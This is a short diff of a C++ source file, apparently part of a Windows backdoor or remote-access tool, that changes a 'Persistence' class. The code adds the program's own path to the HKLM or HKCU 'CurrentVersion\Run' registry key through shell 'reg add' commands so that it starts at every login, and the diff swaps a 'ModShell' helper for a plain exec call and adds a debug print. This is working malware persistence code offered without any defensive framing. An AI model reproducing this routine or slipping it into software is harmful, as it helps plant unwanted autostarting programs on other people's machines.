@@ -9,7 +9,7 @@
 
 #include "../inc/Persistence.h"
 //#include "../inc/HandShake.h"
-#include "../inc/ModShell.h"
+#include "../inc/other.h"
 #include "../inc/common.h"
 
 using namespace std;
@@ -19,7 +19,7 @@ Persistence::Persistence(bool admin,string path_prog)
 {
     a_is_admin = admin;
     a_path_prog = path_prog;
-
+    cout << NAME_KEY_REGISTER << endl;
     cout <<"INFO PERSISTENCE: " << a_is_admin << "   ::   " << path_prog << endl;
 }
 
@@ -34,13 +34,13 @@ void Persistence::defaultPersi()
         //If admin   
         cout << " \nADMIN\n" << endl;
         cout <<"reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /d " +a_path_prog + " /v " NAME_KEY_REGISTER << endl;
-        ModShell().exec(("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /d " +a_path_prog+  " /v " NAME_KEY_REGISTER),result);
+        result = exec(("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /d " +a_path_prog+  " /v " NAME_KEY_REGISTER));
         cout <<"Result admin: " <<result << endl;
     }
     else
     {
         cout <<"reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /d "+a_path_prog+" /v " NAME_KEY_REGISTER << endl;
-        ModShell().exec(("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /d "+a_path_prog+" /v " NAME_KEY_REGISTER),result);
+        result = exec(("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /d "+a_path_prog+" /v " NAME_KEY_REGISTER));
         cout << "NOt admin result: " << result << endl;
     }
     cout <<"[+] PERSISTENCE FINISH" << endl;
